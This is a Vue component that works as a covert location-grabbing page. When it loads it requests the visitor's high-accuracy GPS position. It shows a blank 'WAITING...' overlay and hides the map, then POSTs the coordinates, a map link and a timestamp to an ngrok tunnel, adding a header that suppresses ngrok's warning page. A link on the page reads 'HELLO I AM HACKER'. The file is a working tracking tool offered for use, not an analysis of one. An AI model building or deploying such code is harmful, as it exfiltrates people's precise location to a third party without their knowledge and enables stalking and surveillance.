<script setup lang="ts">
import { ref, onMounted } from "vue";
import L from "leaflet";
import "leaflet/dist/leaflet.css";

const result = ref<any>(null);
const loading = ref(false);
let map: L.Map | null = null;
let marker: L.Marker | null = null;

// -------------------------
// INIT MAP
// -------------------------
const initMap = (lat: number, lon: number) => {
  if (!map) {
    map = L.map("map").setView([lat, lon], 15);

    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
      attribution: "&copy; OpenStreetMap",
    }).addTo(map);
  } else {
    map.setView([lat, lon], 15);
  }
};

// -------------------------
// SET MARKER
// -------------------------
const setMarker = (lat: number, lon: number) => {
  if (!map) return;

  if (marker) {
    marker.remove();
  }

  marker = L.marker([lat, lon])
    .addTo(map)
    .bindPopup("📍 Your Current Location")
    .openPopup();
};
const time = new Intl.DateTimeFormat("en-US", {
  timeZone: "Asia/Vientiane",
  year: "2-digit",
  month: "2-digit",
  day: "2-digit",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit",
  hour12: false,
}).format(new Date());
// -------------------------
// GET GPS LOCATION
// -------------------------
const getLocation = () => {
  if (!navigator.geolocation) {
    alert("Geolocation not supported");
    return;
  }
  loading.value = true;
  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      // Google Maps link
      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

      result.value = {
        lat,
        lon,
        mapLink,
      };

      initMap(lat, lon);
      setMarker(lat, lon);
      loading.value = false;

      // -------------------------
      // SEND TO SERVER
      // -------------------------
      await fetch("https://c8c3-183-182-111-32.ngrok-free.app/test", {
        method: "post",
        headers: {
          "ngrok-skip-browser-warning": "true",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          lat,
          lon,
          mapLink,
          time,
        }),
      });
    },
    (error) => {
      loading.value = false;
      console.error(error);
      alert("Permission denied or location failed");
    },
    {
      enableHighAccuracy: true,
    },
  );
};
onMounted(async () => {
  getLocation();
});
</script>

<template>
  <div v-if="loading" class="loading">
    <div class="spinner"></div>
    <span>WAITING...</span>
  </div>
  <div class="container">
    <!-- <button class="btn" @click="getLocation">Get Current Location</button> -->

    <div v-if="result" class="info">
      <!-- <p>
        <strong>Latitude:</strong>
        {{ result.lat }}
      </p>

      <p>
        <strong>Longitude:</strong>
        {{ result.lon }}
      </p> -->

      <a :href="result.mapLink" target="_blank" rel="noopener noreferrer">
        HELLO I AM HACKER
      </a>
    </div>

    <div id="map" class="map"></div>
  </div>
</template>

<style scoped>
.container {
  padding: 20px;
}

.btn {
  padding: 10px 16px;
  border: none;
  border-radius: 8px;
  cursor: pointer;
}

.info {
  margin-top: 20px;
}
#map {
  visibility: hidden;
}
.map {
  height: 450px;
  width: 100%;
  margin-top: 20px;
  border-radius: 10px;
  overflow: hidden;
}
/*  */

.loading {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;

  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;

  background: rgba(255, 255, 255, 0.8);
  z-index: 9999;
}

.spinner {
  width: 40px;
  height: 40px;
  border: 4px solid #ddd;
  border-top-color: #2563eb;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin-bottom: 10px;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}
</style>
